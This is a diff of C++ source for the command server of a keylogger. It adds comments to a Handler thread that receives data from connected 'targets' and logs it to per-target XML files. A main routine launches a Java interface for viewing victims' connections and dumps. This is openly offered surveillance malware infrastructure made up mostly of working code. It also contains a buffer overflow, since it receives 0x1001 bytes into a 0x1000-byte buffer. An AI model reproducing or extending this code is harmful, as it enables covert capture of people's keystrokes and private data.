@@ -172,72 +172,195 @@ void Listener()
     }
 
 }
-
+/**
+    Title: Handler
+    Description: Processes pre established connections listening for data to come in
+    on any of the sockets stored in the self referential linked list, if data is present
+    on the buffer then it is written to the xml file that corresponds to that connection
+    when a connection is closed then tis method should close all open handles and remove
+    that connection from the linked list.
+    this method should only accept 4096 bytes at a time
+*/
 void Handler()
 {
+        /*
+            the  buffer that stores data off of incoming socket streams
+        */
         char* buffer = static_cast<char *>(malloc(0x1000));
+        /*
+            a temporary link that stores the current socket being processed by this
+            server
+        */
         SOCKETLIST *link;
         while(1)
         {
-
+           /*
+                wait for a connection to be established but don't spin uncontrollably and
+                waist cpu time
+           */
             while(head==nullptr ||(head->target)== NULL )
                 Sleep(1);
+            /*
+                if a connection is established then wait for the mutex lock to protect the
+                buffer
+            */
             WaitForSingleObject(mu,INFINITE);
-                link=head;
+            /*
+                set the link to the head of the self referential linked list.
+            */
+            link=head;
+            /*
+                the head was successfully set. release the mutex lock
+            */
             ReleaseMutex(mu);
+            /*
+                stay in the main handling loop until the next target becomes null,
+            */
             while((head->target)!=NULL)
             {
-
+                /*
+                    receive data from this link while data can be received but do not block
+                    instead let the execution continue on and process the next socket.
+                */
                 while(recv(*(link->target),buffer,0x1001,0) !=  SOCKET_ERROR )
                 {
+                        /*
+                            ensure that the last byte in the received buffer is null terminated
+                        */
                         *(buffer+0x1000)=0x00;
+                        /*
+                            write the entire contents of the null terminated buffer to the corresponding
+                            xml output file.
+                        */
                         WriteFile(link->FileDescriptor,buffer,strlen(buffer),NULL,NULL);
+                        /*
+                            write the ending xml tag to the xml file so that the document is always complete
+                        */
                         WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
                                   strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
+                        /*
+                            set the file pointer back to the start of the ending xml tag so it can be over-written
+                            in the next pass.
+                        */
                         SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);
                 }
+                /*
+                    if the accept method would normally block then an error hasn't occurred remove the error and
+                    move to the next socket in the list.
+                */
                 if (WSAGetLastError() == WSAEWOULDBLOCK)
                 {
+                    /*
+                        delay 1 ms before getting the next quantum this thread will be scheduled
+                        for.
+                    */
                     Sleep(1);
+                    /*
+                        clear the last error for the next iteration
+                    */
                     WSASetLastError(0x00);
+                    /*
+                        move on to the next socket in the connection list
+                    */
                     link = (link->nextTarget);
                     Sleep(1); //give up a millisecond to stop heavy disk right from crashing the program
                 }
+                /*
+                    if the connection is errored out and disconnected then this program should terminate
+                    that connection and close resources properly.
+                */
                 else
                 {
-                    SOCKETLIST temp = *(link->nextTarget);
-
+                    /*
+                        register a lock on the global mutex that protects the buffer.
+                    */
                    WaitForSingleObject(mu,INFINITE);
+                   /*
+                        create a socketlist to hold the nexttarget
+                   */
+                   SOCKETLIST temp = *(link->nextTarget);
+                   /*
+                        if the next target is the same as the current target
+                        then the current target is the only link in the list. close this
+                        target.
+                   */
                    if( link->target == temp.target)
                     {
+                        /*
+                            set the head to null
+                        */
                         head->target=0x00;
+                        /*
+                            set the next target to null
+                        */
                         head->nextTarget=0x00;
+                        /*
+                            set the ip address to null
+                        */
+                        head->IPADDR=0x00;
+                        /*
+                            close the file descriptor handle
+                        */
+                        CloseHandle(head->FileDescriptor);
                     }
                     else
                     {
-
-                      link->target = link->nextTarget->target;
-                      link->nextTarget=link->nextTarget->nextTarget;
-                      head = link;
+                        /*
+                            set the link target to the next targets target
+                        */
+                        link->target = link->nextTarget->target;
+                        /*
+                            set this links name to the next targets name.
+                        */
+                        link->name = link->nextTarget->name;
+                        /*
+                            set this links IPADDR to the next links IPADDR
+                        */
+                        link->IPADDR=link->nextTarget->IPADDR;
+                        /*
+                            close the handle to this links FileDescriptor
+                        */
+                        CloseHandle(link->FileDescriptor);
+                        /*
+                            set this links file descriptor to the next links file
+                            descriptor
+                        */
+                        link->FileDescriptor = link->nextTarget->FileDescriptor;
+                        /*
+                            set this links next target to the next target of the
+                            next target.
+                        */
+                        link->nextTarget=link->nextTarget->nextTarget;
+                        /*
+                            set the head to the new link.
+                        */
+                        head = link;
                     }
-                    ReleaseMutex(mu);
+                    /*
+                        in this branch of execution the number of branches has decremented
+                        indicate that this has happened.
+                    */
                     ConnectionCount--;
+                    /*
+                        release the handle to the mutex.
+                    */
+                    ReleaseMutex(mu);
                 }
 
             }
         }
 }
 /**
-    Title: main, initiates the java virtual machine and starts the 
+    Title: main, initiates the java virtual machine and starts the
     two threads that process connections. thread 1 controls the initial
-    connections and inserts them into a self referential linked list, 
-    thread 2 iterates through the linked list and reads any incoming data 
-    to an xml file. 
-    the main thread finishes by transitioning into the jvm which is left to 
-    control the user interface. the user-interface is subject to change over the 
+    connections and inserts them into a self referential linked list,
+    thread 2 iterates through the linked list and reads any incoming data
+    to an xml file.
+    the main thread finishes by transitioning into the jvm which is left to
+    control the user interface. the user-interface is subject to change over the
     course of time but should enable the user to do the following.
         1.) view all incoming connections from targets.
-        2.) display dumps of the xml in a human readable form to the end user. 
+        2.) display dumps of the xml in a human readable form to the end user.
 */
 int main()
 {
@@ -246,7 +369,7 @@ int main()
     */
     ConnectionCount=0;
     /*a
-        initiate the mutex lock that secures the connection buffer during any 
+        initiate the mutex lock that secures the connection buffer during any
         access.
     */
     mu = CreateMutex(NULL,false,NULL);
@@ -256,18 +379,18 @@ int main()
     */
     WaitForSingleObject(mu,INFINITE);
     /*
-        establish a schedule parameter to set a high priority thread on the listener 
+        establish a schedule parameter to set a high priority thread on the listener
         thread and the handler thread
     */
-    sched_param sch_params; 
+    sched_param sch_params;
     /*
         set the scheduler priority to the highest priority.
-            [NOTE: this is not a real time thread. DO NOT change this thread priority 
+            [NOTE: this is not a real time thread. DO NOT change this thread priority
             to real time under any circumstance]
     */
     sch_params.sched_priority =THREAD_PRIORITY_HIGHEST;
     /*
-        start the listener thread that will connect clients and insert the socket into 
+        start the listener thread that will connect clients and insert the socket into
         a self referential linked list.
     */
     std::thread thread1 (Listener);
@@ -290,13 +413,13 @@ int main()
         printf("[*] priority of data listener increased successfully!\n");
     }
     /*
-        now that the threads have been started and their process level has increased 
+        now that the threads have been started and their process level has increased
         the mutex can be unlcoked allowing for the other threads to begin processing.
     */
     ReleaseMutex(mu);
-    /*  
+    /*
         release the remainder of the quantum and wait for 1/10th of a second before initiating
-        the java thread, give the handler and listener time to process without a priority boost 
+        the java thread, give the handler and listener time to process without a priority boost
         interrupt.
     */
     Sleep(100);
@@ -313,7 +436,7 @@ int main()
     */
     option[0].optionString= const_cast<char*>("-Djava.class.path=.\\KeyLoggerInterface\\build\\classes;");
     /*
-        initiate the jvm to version 8 
+        initiate the jvm to version 8
     */
     args.version = JNI_VERSION_1_8;
     /*
